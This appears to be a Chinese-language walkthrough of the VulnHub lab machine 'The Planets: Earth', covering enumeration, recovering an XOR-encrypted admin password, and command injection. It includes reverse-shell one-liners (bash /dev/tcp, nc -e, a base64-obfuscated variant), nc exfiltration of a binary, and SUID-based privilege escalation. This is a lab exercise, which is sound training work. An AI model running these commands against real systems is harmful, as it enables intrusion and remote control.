# The Planets: Earth(行星-地球)

> 靶机文档：[The Planets: Earth](https://www.vulnhub.com/entry/the-planets-earth,755/)
>
> 下载地址：[**Download (Mirror)**](https://download.vulnhub.com/theplanets/Earth.ova)
>
> 难易程度：**so Easy**

### 信息收集

#### 主机发现

![image-20230916172532179](./imgs/image-20230916172532179.png)

#### 端口扫描

![image-20230916173802102](./imgs/image-20230916173802102.png)

`80端口`

![image-20230916173346313](./imgs/image-20230916173346313.png)



需要做映射`/etc/hosts`

![image-20230916174150530](./imgs/image-20230916174150530.png)

`https://earth.local/`

![image-20230916174328382](./imgs/image-20230916174328382.png)



`https://terratest.earth.local/`

![image-20230916174338954](./imgs/image-20230916174338954.png)

#### 目录扫描

扫描`http`协议是没有结果的，需要对`https协议`做扫描

#### dirsearch

```bash
dirsearch -u https://earth.local/ -i 200
```

![image-20230916174444442](./imgs/image-20230916174444442.png)

```bash
dirsearch -u https://terratest.earth.local/ -i 200
```

![image-20230916174542427](./imgs/image-20230916174542427.png)

`https://earth.local/admin/login`

![image-20230916174727671](./imgs/image-20230916174727671.png)





`https://terratest.earth.local/robots.txt`

发现除了常规的格式不能访问之外，最后还多了一个`Disallow: /testingnotes.*`



![image-20230916174747692](./imgs/image-20230916174747692.png)

和上面的后缀格式拼接访问发现`txt`文件可以访问

访问`/testingnotes.txt`

![image-20230916175136648](./imgs/image-20230916175136648.png)

得到的信息有：

- 使用XOR加密
- testdata.txt用于测试加密。
- terra用作管理门户的用户名

访问`/testdata.txt`

![image-20230916175606950](./imgs/image-20230916175606950.png)

![image-20230916175554659](./imgs/image-20230916175554659.png)

### 漏洞利用

`https://earth.local/`

![image-20230916175810799](./imgs/image-20230916175810799.png)

通过三个秘钥去尝试找到用户名为`terra`对应的密码

前两个密钥不能用

![image-20230916182242783](./imgs/image-20230916182242783.png)

得到密码：`earthclimatechangebad4humans`

**username:   terra**

**password：earthclimatechangebad4human**

来到登陆页面进行登陆

![image-20230916182336250](./imgs/image-20230916182336250.png)

命令执行漏洞

![image-20230916182417937](./imgs/image-20230916182417937.png)

![image-20230916182545051](./imgs/image-20230916182545051.png)

#### 反弹shell

```bash 
bash -i &> /deb/tcp/192.168.8.8/6868 0>&1
```



![image-20230916182711979](./imgs/image-20230916182711979.png)

```text
nc 192.168.8.8 6868 -e /bin/bash
```

![image-20230916183656198](./imgs/image-20230916183656198.png)

只输入base64编码是不行的要结合解码命令

```bash
echo "bmMgMTkyLjE2OC44LjggNjg2OCAtZSAvYmluL2Jhc2gK"| base64 -d |bash
```

反弹到kali机器上

![image-20230916183832611](./imgs/image-20230916183832611.png)

交互式shell

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

尝试sudo -l 没有可以运行sudo的文件

执行 find / -perm -u=s -type f 2>/dev/null 查找一些高权限文件

![image-20230916184057235](./imgs/image-20230916184057235.png)



![image-20230916184027906](./imgs/image-20230916184027906.png)



但是用户切换失败

![image-20230916184413662](./imgs/image-20230916184413662.png)

#### nc文件传输

[使用nc传输文件](https://blog.csdn.net/huangzx3/article/details/80844439)

先在kali上输入`nc -nlvp 6868 >reset_root`，开启监听

在靶机shell上输入`nc 192.168.8.8 6868</usr/bin/reset_root`



#### strace调试工具

使用strace工具检测reset_root文件的运行过程，如果没有可以下载安装下

![image-20230916185111228](./imgs/image-20230916185111228.png)

![image-20230916185128929](./imgs/image-20230916185128929.png)

发现文件执行失败是因为少了这三个文件或目录。

因此在靶机shell上创建这三个文件

进入靶机终端进行创键

```bash
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
```

创建完成后执行`reset_root`

![image-20230916185315925](./imgs/image-20230916185315925.png)

![image-20230916185339793](./imgs/image-20230916185339793.png)